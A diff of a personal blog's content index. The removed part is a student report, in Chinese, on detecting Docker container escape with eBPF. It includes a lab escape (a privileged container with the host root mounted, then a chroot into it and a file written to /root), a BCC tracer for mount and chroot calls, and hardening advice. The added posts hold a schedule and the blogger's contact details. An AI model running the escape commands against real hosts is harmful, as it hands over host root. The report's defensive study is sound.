-<li><strong>RASP(Runtime Application Self Protection)</strong>: RASP可利用eBPF 監控應用程式運行時的系統呼叫，動態檢測異常行為，如未授權的檔案訪問。</li>
-</ul>
-<p>本次報告透過bcc工具集撰寫eBPF程式，監控容器中是否有進行chroot或 mount系統呼叫，藉此識別潛在逃逸行為。</p>
-<h1 id="三、容器逃逸技術概論"><a href="#三、容器逃逸技術概論" class="headerlink" title="三、容器逃逸技術概論"></a>三、容器逃逸技術概論</h1><h2 id="1-容器逃逸的背景"><a href="#1-容器逃逸的背景" class="headerlink" title="1. 容器逃逸的背景"></a>1. 容器逃逸的背景</h2><p>容器化技術(如:Docker)為開發領域帶來極大的便捷性，尤其在資源隔離、快速部署與應用擴展方面表現突出，不過，這與虛擬機(VM)不同，容器的隔離機制較為輕量，容器和宿主機共享相同的操作系統核心(kernel)，代表若容器內部的應用程序或攻擊者能突破容器內的安全限制，就有可能對宿主機或其他容器造成威脅，這種攻擊方式被稱為「容器逃逸(Container Escape)」。</p>
-<p>容器逃逸指的是<strong>攻擊者從一個容器內部，繞過容器的隔離機制，進而取得宿主機的控制權或對其他容器造成影響</strong>。容器逃逸通常涉及利用容器的配置錯誤、漏洞或過度授權的權限進行攻擊。</p>
-<h2 id="2-容器逃逸的典型手段"><a href="#2-容器逃逸的典型手段" class="headerlink" title="2. 容器逃逸的典型手段"></a>2. 容器逃逸的典型手段</h2><p>容器逃逸的攻擊手段多種多樣，常見的手段包括: </p>
-<ul>
-<li><strong>利用容器權限過高</strong>: 若容器以 –privileged 模式運行，將擁有接近宿主機的操作權限，攻擊者可以繞過容器隔離。</li>
-<li><strong>漏洞利用</strong>: 攻擊者可透過容器中運行的應用程式或內核漏洞，利用已知漏洞發起攻擊，如: CVE-2019-5736 (runc 漏洞)。</li>
-<li><strong>修改容器配置或掛載點</strong>: 攻擊者可通過篡改容器中的掛載點(例如 &#x2F;proc、&#x2F;sys 目錄)，直接訪問宿主機的敏感檔案系統。</li>
-<li><strong>利用 chroot或 mount系統呼叫</strong>: 若容器內部的應用程式能夠調用 chroot或 mount系統呼叫，便能將根目錄或其他檔案系統映射到宿主機，從而實現逃逸。</li>
-</ul>
-<p><img src="/images/image1.png"><br>容器逃逸行為的攻擊架構流程圖。(使用mermaid繪製)</p>
-<h2 id="3-本報告的容器逃逸案例"><a href="#3-本報告的容器逃逸案例" class="headerlink" title="3. 本報告的容器逃逸案例"></a>3. 本報告的容器逃逸案例</h2><p>本報告使用兩種系統呼叫作為容器逃逸的核心攻擊手段:</p>
-<ul>
-<li><strong>chroot系統呼叫</strong>: chroot是一種將進程根目錄更改為指定目錄的操作。攻擊者通過使用 chroot可以將容器中的根目錄映射到宿主機的某一位置，從而使容器內部的進程能夠直接訪問宿主機的檔案系統。若容器有足夠權限執行 chroot，將會導致容器逃逸。</li>
-<li><strong>mount系統呼叫</strong>: mount呼叫用於將外部檔案系統掛載到指定目錄。如果攻擊者能夠在容器中執行 mount操作並將宿主機的檔案系統掛載到容器中，就能夠繞過容器的隔離機制，直接進到宿主機的檔案系統，進而實現逃逸。</li>
-</ul>
-<h2 id="4-逃逸的風險與影響"><a href="#4-逃逸的風險與影響" class="headerlink" title="4. 逃逸的風險與影響"></a>4. 逃逸的風險與影響</h2><p>成功的容器逃逸攻擊不僅意味著攻擊者能夠繞過容器的隔離，還可能帶來嚴重的安全問題，具體影響包括: </p>
-<ul>
-<li><strong>取得宿主機控制權</strong>: 攻擊者可以利用容器逃逸攻擊獲得宿主機的 root權限，進而執行任意命令或改動系統設置。</li>
-<li><strong>跨容器攻擊</strong>: 一旦攻擊者成功逃逸容器，便能夠對其他容器進行橫向移動，破壞整個容器環境中的應用。</li>
-<li><strong>資料竊取與損壞</strong>: 攻擊者可讀取或修改宿主機上的敏感資料，甚至可能破壞整體系統。</li>
-</ul>
-<h2 id="5-容器逃逸防禦"><a href="#5-容器逃逸防禦" class="headerlink" title="5. 容器逃逸防禦"></a>5. 容器逃逸防禦</h2><p>為了防範容器逃逸，企業與開發者需遵循最佳安全實踐，包括但不限於: </p>
-<ul>
-<li><strong>限制容器權限</strong>: 避免容器以 –privileged 模式運行，並確保容器內的應用程序不具備過多的操作系統權限。</li>
-<li><strong>使用最新的內核版本</strong>: 定期更新內核及容器平台、修補已知漏洞、加強容器配置的安全性。</li>
-<li><strong>強化系統呼叫過濾</strong>: 透過eBPF等技術，對關鍵系統呼叫(如 mount、chroot)進行監控與過濾，及時發現異常行為。</li>
-</ul>
-<p><img src="/images/image2.png"><br>對關鍵系統呼叫(如 mount、chroot)進行監控架構圖。(使用mermaid繪製)</p>
-<h1 id="四、實驗環境與配置"><a href="#四、實驗環境與配置" class="headerlink" title="四、實驗環境與配置"></a>四、實驗環境與配置</h1><p>以下內容可搭配個人實際demo影片: <a href="https://www.youtube.com/watch?v=K-QwDysbjXU">https://www.youtube.com/watch?v=K-QwDysbjXU</a></p>
-<iframe width="560" height="315" src="https://www.youtube.com/embed/K-QwDysbjXU?si=VGYvio-XmMEqO0F2" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
-
-<h2 id="1-環境架構總覽"><a href="#1-環境架構總覽" class="headerlink" title="1. 環境架構總覽"></a>1. 環境架構總覽</h2><p>本次實驗以一Ubuntu虛擬機架構進行，VM同時作為監控端(eBPF 偵測機制所在)與繞過端(發動容器逃逸行為)。</p>
-<ul>
-<li>虛擬機作業系統: Ubuntu22.04 LTS(宿主機)、Linux 6.8.0-59-generic</li>
-<li>容器映像檔: ubuntu: 22.04 (攻擊容器)</li>
-<li>容器管理工具: Docker version 28.1.1</li>
-<li>eBPF 工具鏈: BCC(BPF Compiler Collection)</li>
-</ul>
-<h2 id="2-系統前置安裝-Ubuntu宿主機執行"><a href="#2-系統前置安裝-Ubuntu宿主機執行" class="headerlink" title="2. 系統前置安裝(Ubuntu宿主機執行)"></a>2. 系統前置安裝(Ubuntu宿主機執行)</h2><p>以下操作皆於宿主機進行，用以安裝eBPF所需的套件及 Docker 環境:</p>
-<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt-get update</span><br></pre></td></tr></table></figure>
-<p><img src="/images/image3.png"></p>
-<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt-get install -y docker.io bpfcc-tools python3-bpfcc linux-headers-$(<span class="built_in">uname</span> -r)</span><br></pre></td></tr></table></figure>
-<p><img src="/images/image4.png"></p>
-<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> systemctl <span class="built_in">enable</span> --now docker</span><br></pre></td></tr></table></figure>
-<p><img src="/images/image5.png"></p>
-<p>確認 BPF 工具能正常使用: </p>
-<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span> /usr/share/bcc/tools/</span><br></pre></td></tr></table></figure>
-<p><img src="/images/image6.png"></p>
-<h2 id="3-建立eBPF偵測程式-宿主機執行"><a href="#3-建立eBPF偵測程式-宿主機執行" class="headerlink" title="3. 建立eBPF偵測程式(宿主機執行)"></a>3. 建立eBPF偵測程式(宿主機執行)</h2><p>使用 BCC提供的 trace 工具，掛勾監控 syscall__mount和syscall__chroot，以即時偵測容器中可疑的系統呼叫:</p>
-<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> bcc <span class="keyword">import</span> BPF</span><br><span class="line"></span><br><span class="line">prog = <span class="string">r&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">#include &lt;uapi/linux/ptrace.h&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">int trace_mount(struct pt_regs *ctx) &#123;</span></span><br><span class="line"><span class="string">    bpf_trace_printk(&quot;MOUNT by pid %d\\n&quot;, bpf_get_current_pid_tgid() &gt;&gt; 32);</span></span><br><span class="line"><span class="string">    return 0;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">int trace_chroot(struct pt_regs *ctx) &#123;</span></span><br><span class="line"><span class="string">    bpf_trace_printk(&quot;CHROOT by pid %d\\n&quot;, bpf_get_current_pid_tgid() &gt;&gt; 32);</span></span><br><span class="line"><span class="string">    return 0;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">b = BPF(text=prog)</span><br><span class="line">b.attach_kprobe(event=<span class="string">&quot;__x64_sys_mount&quot;</span>, fn_name=<span class="string">&quot;trace_mount&quot;</span>)</span><br><span class="line">b.attach_kprobe(event=<span class="string">&quot;__x64_sys_chroot&quot;</span>, fn_name=<span class="string">&quot;trace_chroot&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Tracing mount/chroot syscalls... Ctrl-C to exit.&quot;</span>)</span><br><span class="line">b.trace_print()</span><br></pre></td></tr></table></figure>
-<p>上面的程式碼，其中bpf_get_current_pid_tgid()要右移32位元是因為這條function是回傳 64 位元值，高32位元為 PID，低32位元為 TGID，需要右移32位元才可以提取PID。<br>監控時會在終端機輸出: </p>
-<p><img src="/images/image7.png"></p>
-<h2 id="4-建立攻擊容器-宿主機執行"><a href="#4-建立攻擊容器-宿主機執行" class="headerlink" title="4. 建立攻擊容器(宿主機執行)"></a>4. 建立攻擊容器(宿主機執行)</h2><p>使用以下指令建立權限過高的容器，並將宿主機的檔案系統掛載到容器內: </p>
-<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker run -it--rm \</span><br><span class="line">  --privileged \</span><br><span class="line">  -v /: /host: rw \</span><br><span class="line">  ubuntu: 22.04 \</span><br><span class="line">  bash</span><br></pre></td></tr></table></figure>
-<p>這段shell意思: 開啟一個可互動容器(-it)、移除容器結束後的殘留(–rm)、開啟 –privileged 權限、掛載整個 &#x2F;(宿主機根目錄)至容器內的 &#x2F;host。<br>(這個容器是簡化的場景，未來研究可嘗試無–privileged 的逃逸，相關補充可查詢CVE-2024-21626)</p>
-<h2 id="5-在容器中發動逃逸攻擊-容器內部執行"><a href="#5-在容器中發動逃逸攻擊-容器內部執行" class="headerlink" title="5. 在容器中發動逃逸攻擊(容器內部執行)"></a>5. 在容器中發動逃逸攻擊(容器內部執行)</h2><p>在容器內部執行下列指令以逃逸至宿主機的環境: </p>
-<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">chroot</span> /host/bin/bash</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;HACKED by container&quot;</span> &gt;&gt; /root/HACKED.txt</span><br></pre></td></tr></table></figure>
-<p>若成功進入宿主機根目錄，且可以直接將檔案寫入&#x2F;root而不用再加上sudo，即代表逃逸成功。<br><img src="/images/image8.png"><br>同時，宿主機上開啟的 trace 命令應輸出 MOUNT與 CHROOT系統呼叫紀錄，可用作事後調查依據。<br><img src="/images/image9.png"></p>
-<h1 id="五、eBPF偵測原理"><a href="#五、eBPF偵測原理" class="headerlink" title="五、eBPF偵測原理"></a>五、eBPF偵測原理</h1><h2 id="1-為何選擇-eBPF"><a href="#1-為何選擇-eBPF" class="headerlink" title="1. 為何選擇 eBPF ?"></a>1. 為何選擇 eBPF ?</h2><p>eBPF(extended Berkeley PacketFilter)原本是為高效處理封包過濾而生，但近年來演進成為一種「可安全在核心層執行使用者自定義程式」的通用技術，具備以下優點: </p>
-<ul>
-<li><strong>零撰寫核心模組風險</strong>: 透過verifier保證邏輯安全，不會導致Kernel crash。</li>
-<li><strong>即時性高</strong>: 直接嵌入在kernel執行流程中，無須上下文切換。</li>
-<li><strong>可掛鉤syscall</strong>: 可直接追蹤如mount、chroot等系統呼叫，為行為型偵測提供基礎。</li>
-<li><strong>支援tracepoint&#x2F;kprobe&#x2F;uprobe</strong>: 可追蹤核心或應用程式層的各種執行點。</li>
-</ul>
-<h2 id="2-偵測原理概述"><a href="#2-偵測原理概述" class="headerlink" title="2. 偵測原理概述"></a>2. 偵測原理概述</h2><p>容器逃逸常仰賴對宿主機的掛載與chroot操作，eBPF可以在syscall層級偵測這些異常操作。<br>主要偵測目標: </p>
-<ul>
-<li><strong>mount()</strong>: 將宿主機檔案系統掛載進容器。</li>
-<li><strong>chroot()</strong>: 改變根目錄以達到逃逸目的。<br>核心偵測邏輯: </li>
-<li>觀察非預期的mount行為，尤其是對 &#x2F; 或宿主機目錄的掛載。</li>
-<li>判斷是否在容器中發生chroot，且目標為宿主機根目錄(例如: &#x2F;host)。</li>
-<li>搭配 PID 判斷是否來自runc或其他container runtime。</li>
-</ul>
-<h2 id="3-輸出結果與意義"><a href="#3-輸出結果與意義" class="headerlink" title="3. 輸出結果與意義"></a>3. 輸出結果與意義</h2><p>當我們在宿主機開啟上述eBPF偵測程式時，並從容器內部執行逃逸行為(chroot&#x2F;host)，輸出如下:</p>
-<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">b<span class="string">&#x27;   runc:[2:INIT]-27112   [003] ...21 12818.624276: bpf_trace_printk: MOUNT by pid 27112\\n&#x27;</span>                         </span><br><span class="line">b<span class="string">&#x27;   &lt;...&gt;-27148   [000] ...21 12859.718135: bpf_trace_printk: CHROOT by pid 27148\\n&#x27;</span></span><br></pre></td></tr></table></figure>
-<p>runc: [2: INIT] 表示該系統呼叫發自 container 初始化進程。<br>pid 27112 則是可被後續手動比對或自動分析的依據。<br>一連串短時間內的 MOUNT→ CHROOT，表示容器進程試圖脫離原有檔案系統限制，為明顯的逃逸徵兆。</p>
-<h1 id="六、實驗結果與分析"><a href="#六、實驗結果與分析" class="headerlink" title="六、實驗結果與分析"></a>六、實驗結果與分析</h1><h2 id="1-實驗設定回顧"><a href="#1-實驗設定回顧" class="headerlink" title="1. 實驗設定回顧"></a>1. 實驗設定回顧</h2><p>本實驗於單一台Ubuntu22.04虛擬機進行，模擬如下場景: </p>
-<ul>
-<li>宿主機安裝並執行eBPF偵測程式。</li>
-<li>容器內部透過 –privileged 權限啟動後，執行掛載整個宿主機目錄(-v &#x2F;: &#x2F;host)，再利用 chroot&#x2F;host轉移執行環境至宿主機。<br>最後在容器內直接寫入&#x2F;root，發現成功寫入&#x2F;root&#x2F;HACKED.txt且獲得宿主機root權限，證實逃逸成功。</li>
-</ul>
-<h2 id="2-eBPF偵測輸出分析"><a href="#2-eBPF偵測輸出分析" class="headerlink" title="2. eBPF偵測輸出分析"></a>2. eBPF偵測輸出分析</h2><p>當容器內進行 mount與 chroot操作時，宿主機終端機立即輸出以下訊息: </p>
-<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">b<span class="string">&#x27;   runc:[2:INIT]-27112   [003] ...21 12818.496559: bpf_trace_printk: MOUNT by pid 27112\\n&#x27;</span></span><br><span class="line">b<span class="string">&#x27;   runc:[2:INIT]-27112   [003] ...21 12818.496754: bpf_trace_printk: MOUNT by pid 27112\\n&#x27;</span></span><br><span class="line">b<span class="string">&#x27;   runc:[2:INIT]-27112   [003] ...21 12818.496972: bpf_trace_printk: MOUNT by pid 27112\\n&#x27;</span></span><br><span class="line">b<span class="string">&#x27;   runc:[2:INIT]-27112   [003] ...21 12818.497298: bpf_trace_printk: MOUNT by pid 27112\\n&#x27;</span></span><br><span class="line">b<span class="string">&#x27;   runc:[2:INIT]-27112   [003] ...21 12818.497563: bpf_trace_printk: MOUNT by pid 27112\\n&#x27;</span></span><br><span class="line">b<span class="string">&#x27;   runc:[2:INIT]-27112   [003] ...21 12818.497795: bpf_trace_printk: MOUNT by pid 27112\\n&#x27;</span></span><br><span class="line">b<span class="string">&#x27;   runc:[2:INIT]-27112   [003] ...21 12818.499010: bpf_trace_printk: MOUNT by pid 27112\\n&#x27;</span></span><br><span class="line">b<span class="string">&#x27;   runc:[2:INIT]-27112   [003] ...21 12818.501682: bpf_trace_printk: MOUNT by pid 27112\\n&#x27;</span></span><br><span class="line">b<span class="string">&#x27;   runc:[2:INIT]-27112   [003] ...21 12818.502590: bpf_trace_printk: MOUNT by pid 27112\\n&#x27;</span></span><br><span class="line">b<span class="string">&#x27;   runc:[2:INIT]-27112   [003] ...21 12818.502777: bpf_trace_printk: MOUNT by pid 27112\\n&#x27;</span></span><br></pre></td></tr></table></figure>
-<p>從輸出可以觀察出短時間內連續的 MOUNT行為，且來自同一PID，屬於典型逃逸特徵。<br>runc: [2: INIT] 表示該行為由 container runtime 所觸發，並非一般使用者 shell，風險更高。<br>透過 pid 27112 進一步交叉比對容器內外進程，可確定行為來源與目的。</p>
-<h2 id="3-容器內部行為觀察"><a href="#3-容器內部行為觀察" class="headerlink" title="3. 容器內部行為觀察"></a>3. 容器內部行為觀察</h2><p>在容器中執行: </p>
-<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">chroot</span> /host/bin/bash</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;HACKED by container&quot;</span> &gt;&gt; /root/HACKED.txt</span><br></pre></td></tr></table></figure>
-<p>結果為真的寫入&#x2F;root，表示當前shell已轉移至宿主機環境。<br>此時執行 ls &#x2F;root等操作，皆會作用於宿主機的實體 &#x2F;root目錄，若未做防護，攻擊者可直接竄改宿主機關鍵設定或寫入後門程式。</p>
-<h2 id="4-安全分析與行為特徵彙整"><a href="#4-安全分析與行為特徵彙整" class="headerlink" title="4. 安全分析與行為特徵彙整"></a>4. 安全分析與行為特徵彙整</h2><table>
-<thead>
-<tr>
-<th>行為</th>
-<th>是否異常</th>
-<th>說明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>掛載 &#x2F; 或 &#x2F;host</td>
-<td>是</td>
-<td>表示容器嘗試讀取整個宿主機檔案系統</td>
-</tr>
-<tr>
-<td>執行 chroot&#x2F;host</td>
-<td>是</td>
-<td>將容器內 shell 移至宿主機空間</td>
-</tr>
-<tr>
-<td>使用者為 root</td>
-<td>需視情境</td>
-<td>若容器內 root 對應宿主機 root為嚴重問題；若啟用user namespace，風險較低</td>
-</tr>
-<tr>
-<td>若 PID 出現在 eBPF 輸出中，且與 runc 有關</td>
-<td>是</td>
-<td>多為自動化 escape 或惡意 runtime 行為</td>
-</tr>
-</tbody></table>
-<h2 id="5-成效總結"><a href="#5-成效總結" class="headerlink" title="5. 成效總結"></a>5. 成效總結</h2><ul>
-<li>eBPF 成功偵測容器內部異常的系統呼叫，實現了即時、低延遲的偵測效果。</li>
-<li>在不改動 kernel 原始碼的前提下，完成行為型逃逸攻擊的準確攔截與記錄。</li>
-<li>偵測邏輯簡單清晰，可進一步拓展至多種 container runtime 與複雜場景。</li>
-</ul>
-<h1 id="七、對策與建議"><a href="#七、對策與建議" class="headerlink" title="七、對策與建議"></a>七、對策與建議</h1><h2 id="1-限制容器權限-避免使用-–privileged"><a href="#1-限制容器權限-避免使用-–privileged" class="headerlink" title="1. 限制容器權限: 避免使用 –privileged"></a>1. 限制容器權限: 避免使用 –privileged</h2><p>本次容器能成功掛載宿主機根目錄並執行 chroot的主要原因，是 Docker 使用了 –privileged 參數。<br>該參數會賦予容器所有宿主機的 Linux capabilities(如 CAP_SYS_ADMIN)，基本等同於 root。<br>建議做法: </p>
-<ul>
-<li>除非必要，嚴禁使用 –privileged 啟動容器。</li>
-<li>使用 Docker Capabilities 精細調控所需的權限，例如移除 SYS_ADMIN、SYS_CHROOT等敏感能力。</li>
-</ul>
-<h2 id="2-文件系統掛載安全控管"><a href="#2-文件系統掛載安全控管" class="headerlink" title="2. 文件系統掛載安全控管"></a>2. 文件系統掛載安全控管</h2><p>攻擊中將 &#x2F; 掛載至 &#x2F;host，進一步配合 chroot進行空間轉移。<br>建議做法: </p>
-<ul>
-<li>禁止容器掛載敏感路徑(例如宿主機的 &#x2F; 或 &#x2F;proc等)。</li>
-<li>搭配 Seccomp 或 AppArmor 配置限制 mount() 等系統呼叫。</li>
-</ul>
-<h2 id="3-使用eBPF持續監控敏感-syscall"><a href="#3-使用eBPF持續監控敏感-syscall" class="headerlink" title="3. 使用eBPF持續監控敏感 syscall"></a>3. 使用eBPF持續監控敏感 syscall</h2><p>本實驗展示了eBPF能有效監控 mount與 chroot系統呼叫，並記錄可疑行為。<br>相較於傳統 log 分析工具，eBPF 擁有以下優勢: </p>
-<ul>
-<li>可即時追蹤內核層級活動，不需仰賴容器內部 agent。</li>
-<li>可客製監控邏輯，精準匹配逃逸行為模式。<br>建議做法: </li>
-<li>常駐執行簡易eBPF探測模組，設定觸發條件與警報通知。</li>
-<li>搭配 tracee、Tetragon 等開源框架建構eBPF安全監控系統。</li>
-</ul>
-<h2 id="4-實作-Namespace-隔離強化"><a href="#4-實作-Namespace-隔離強化" class="headerlink" title="4. 實作 Namespace 隔離強化"></a>4. 實作 Namespace 隔離強化</h2><p>若容器逃逸行為未搭配完善的 namespace 隔離設計，容易成功竄改宿主系統。<br>建議做法: </p>
-<ul>
-<li>啟用 user namespace，以確保容器內部 root權限對應到宿主非 rootUID。</li>
-<li>使用 gVisor、Kata Containers 等加強隔離型 container runtime。</li>
-</ul>
-<h2 id="5-eBPF安全策略設計建議"><a href="#5-eBPF安全策略設計建議" class="headerlink" title="5. eBPF安全策略設計建議"></a>5. eBPF安全策略設計建議</h2><table>
-<thead>
-<tr>
-<th>偵測行為</th>
-<th>建議策略</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>mount() 呼叫</td>
-<td>僅允許預先定義的 mount目的與來源</td>
-</tr>
-<tr>
-<td>chroot() 呼叫</td>
-<td>僅允許特定目錄或 UID 呼叫執行</td>
-</tr>
-<tr>
-<td>PID 來自 runc</td>
-<td>加強審查 container runtime 初始化行為</td>
-</tr>
-<tr>
-<td>容器 PID 與宿主機交叉</td>
-<td>若 PID 同時出現在 container 與 host，可標記為異常</td>
-</tr>
-</tbody></table>
-<h1 id="八、結論"><a href="#八、結論" class="headerlink" title="八、結論"></a>八、結論</h1><p>本報告深入探討了使用eBPF偵測容器逃逸行為的可行性與實作細節，透過在單一台 Ubuntu22.04 虛擬機中進行的實驗，我們成功模擬出一個基於 –privileged權限與chroot()技術的容器逃逸案例，並證明eBPF可在不干擾系統運作的情況下，即時攔截與記錄高風險的系統呼叫(如 mount() 和 chroot())，該偵測方式具備低延遲、低開銷與高度靈活性，對於雲端原生環境中零信任架構的實現具有極高的實務價值。</p>
-<p>從安全防禦角度來看，eBPF 並非單一解方，而是應當作一個可擴充的監控框架，與Docker權限控管、Namespace隔離、系統資源限制(如 Seccomp、AppArmor)等多層防禦機制整合。藉由持續性偵測與行為模式分析，eBPF 可有效從微觀層面補足傳統安全方案在容器場域中的不足之處。</p>
-<p>最後，雖然本次實驗選擇使用較簡化的非CVE攻擊路徑，並僅以基本的 tracepoint 做偵測，但這也顯示出: 即使是初階的eBPF腳本與行為觀察，也能在實務中產生實質的安全防禦成效，未來可結合 ML 分析 eBPF 輸出的行為模式，實現自動化異常檢測。<br><img src="/images/image10.png"><br>此圖為此次報告完整架構圖，可以清楚看到chroot到宿主機的全過程 (使用mermaid繪製)</p>
-<h1 id="九、心得"><a href="#九、心得" class="headerlink" title="九、心得"></a>九、心得</h1><p>這份的主題啟發來自最近跟著實驗室在做專題時，同一台伺服器上有許多docker容器，有的容器是已對外公開的網頁，有的是對外公開的API，那我要怎麼確保我自己開的docker不會去影響到其他學長姐的成果，所以我就從這個角度往資安方向去做衍生，最一開始想的是: 我有可能可以從我的docker裡面去影響到全域的環境變數嗎? 還真的被我找到一篇2019年的漏洞，不過它可以直接造成RCE就是了，CVE編號: <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-5736">CVE-2019-5736</a>，主要是在講二進位檔案會造成RCE，詳細邏輯不詳談，但事實是可以做得到的。</p>
-<p>再來就是去年的<a href="https://nvd.nist.gov/vuln/detail/CVE-2024-8695">CVE-2024-8695</a>、<a href="https://nvd.nist.gov/vuln/detail/CVE-2024-8696">CVE-2024-8696</a>、<a href="https://nvd.nist.gov/vuln/detail/CVE-2024-21626">CVE-2024-21626</a>，這三篇基本上都是容器逃逸的實際漏洞，也因此這份報告選用chroot 和 mount 作為模擬場景，而這些CVE邏輯跟這份報告所做的差不多，只是需要多加一些bypass的地方需要更深入研究，如果有空想要復現的話就把–privileged拿掉，不要讓docker容器權限這麼高，再實際去exploit-db找腳本試，應該也是個蠻好玩的復現(個人覺得這總比apache好玩多了xd)，這次最困難的地方大概是釐清一些eBPF的基本機制和環境吧，繞過的邏輯順了以後其實沒有太難，基本上有一大半的時間都在調整環境，一下子linux headers版本衝突，一下子docker環境不符合，一下子又抓不到bcc位置，中途還想說再不行我就鬼轉題目來研究了，不過好險最後一步一步的調整就成功復現了!</p>
-<h1 id="十、部分參考資料"><a href="#十、部分參考資料" class="headerlink" title="十、部分參考資料"></a>十、部分參考資料</h1><p>GitHub:<br><a href="https://github.com/iovisor/bcc">https://github.com/iovisor/bcc</a>,<br><a href="https://github.com/aquasecurity/tracee">https://github.com/aquasecurity/tracee</a>,<br><a href="https://github.com/pathtofile/bad-bpf">https://github.com/pathtofile/bad-bpf</a>, </p>
-<p>Linux中基於eBPF的惡意利用與檢測機制: <a href="https://kknews.cc/zh-tw/n/gx6j5y9.html">https://kknews.cc/zh-tw/n/gx6j5y9.html</a></p>
-<p>高效入門eBPF:<br><a href="https://github.com/gojue/ebpf-slide/blob/master/eBPF_basic/%E9%AB%98%E6%95%88%E5%85%A5%E9%97%A8eBPF-%E8%A5%BF%E5%AE%89%E9%82%AE%E7%94%B5%E5%A4%A7%E5%AD%A6-%E8%B4%BA%E4%B8%9C%E5%8D%87.pdf">https://github.com/gojue/ebpf-slide/blob/master/eBPF_basic&#x2F;%E9%AB%98%E6%95%88%E5%85%A5%E9%97%A8eBPF-%E8%A5%BF%E5%AE%89%E9%82%AE%E7%94%B5%E5%A4%A7%E5%AD%A6-%E8%B4%BA%E4%B8%9C%E5%8D%87.pdf</a></p>
-<p>分享一些eBPF技术相关的PDF: <a href="https://www.cnxct.com/ebpf-slide-pdf-share/#ftoc-heading-3">https://www.cnxct.com/ebpf-slide-pdf-share/#ftoc-heading-3</a></p>
-<p>复现基于eBPF实现的Docker逃逸: <a href="https://drivertom.blogspot.com/2022/01/ebpfdocker.html">https://drivertom.blogspot.com/2022/01/ebpfdocker.html</a></p>
-<p>黑客利用 Linux eBPF 持续传播恶意软件: <a href="https://www.anquanke.com/post/id/302837">https://www.anquanke.com/post/id/302837</a></p>
-<p>DEFCON: <a href="https://defcon.org/html/defcon-29/dc-29-speakers.html#path">https://defcon.org/html/defcon-29/dc-29-speakers.html#path</a> </p>
-<p>Day04 - (攻擊) 容器逃逸手法 nsenter: <a href="https://ithelp.ithome.com.tw/m/articles/10316981">https://ithelp.ithome.com.tw/m/articles/10316981</a></p>
-<p>eBPF linux運行時惡意利用: <a href="https://v.qq.com/txp/iframe/player.html?vid=e33246j5zi5">https://v.qq.com/txp/iframe/player.html?vid=e33246j5zi5</a></p>
-<p>datadog的eBPF安全检测机制分析: <a href="https://mp.weixin.qq.com/s/SAPz4Z1m2gVtQWzt68u6eg">https://mp.weixin.qq.com/s/SAPz4Z1m2gVtQWzt68u6eg</a></p>
-]]></content>
-      <categories>
-        <category>資安</category>
-      </categories>
-  </entry>
-  <entry>
     <title>特殊選才</title>
     <url>/interview/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>嗨嗨 我是che，成功用特殊選材上岸啦!! <a href="https://chewu-0319.github.io/personal/about/">這裡</a> 有較詳細的個人經歷。</p>
@@ -1505,6 +1415,218 @@ ABaB
       </categories>
   </entry>
   <entry>
+    <title>個人時間表</title>
+    <url>/personal_schedule/</url>
+    <content><![CDATA[<h1 id="此為-2024-10月-2025寒假前-日程表"><a href="#此為-2024-10月-2025寒假前-日程表" class="headerlink" title="此為 2024&#x2F;10月-2025寒假前 日程表"></a>此為 2024&#x2F;10月-2025寒假前 日程表</h1><p><img src="/images/sch.png"></p>
+<ul>
+<li>藍色: 在學校</li>
+<li>綠色: 在家裡忙</li>
+<li>紫色: 社團</li>
+<li>灰色: 空閒</li>
+</ul>
+<p>聯絡方式:</p>
+<ul>
+<li>email: <a href="mailto:dylan.jc2222@gmail.com" title="吳昕哲">吳昕哲</a></li>
+<li>discord: <a href="https://discordapp.com/users/768889520280043561" title="che哲#4541">che哲#4541</a></li>
+<li>instagram: <a href="https://www.instagram.com/che._.wu/" title="che._.wu">che._.wu</a></li>
+</ul>
+<hr>
+<!-- Start of CuterCounter Code -->
+<p><a href="https://www.cutercounter.com/traditional-chinese-nn/" target="_blank" style="pointer-events: none;"><img src="https://www.cutercounter.com/hits.php?id=hxqxdco&nd=6&style=11" border="0" alt="免費網站計數器"></a></p>
+<!-- End of CuterCounter Code -->
+
+]]></content>
+      <categories>
+        <category>個人時間表</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>g0v summit 2024</title>
+    <url>/g0vsummit/</url>
+    <content><![CDATA[<h1 id="g0v-summit"><a href="#g0v-summit" class="headerlink" title="g0v summit"></a>g0v summit</h1><h2 id="我都在幹嘛"><a href="#我都在幹嘛" class="headerlink" title="我都在幹嘛?"></a>我都在幹嘛?</h2><ul>
+<li>工作人員<ul>
+<li>搬椅子</li>
+<li>搬桌子</li>
+<li>場佈</li>
+<li>動線規劃</li>
+<li>拆</li>
+<li>坐在電梯前指引</li>
+<li>被外國人問路</li>
+</ul>
+</li>
+<li>福利<ul>
+<li>吃吃吃吃吃吃吃吃…</li>
+<li>喝喝喝喝喝喝喝喝…</li>
+<li>免費住宿 中研院活動中心</li>
+<li>仙草茶 (呵</li>
+</ul>
+</li>
+</ul>
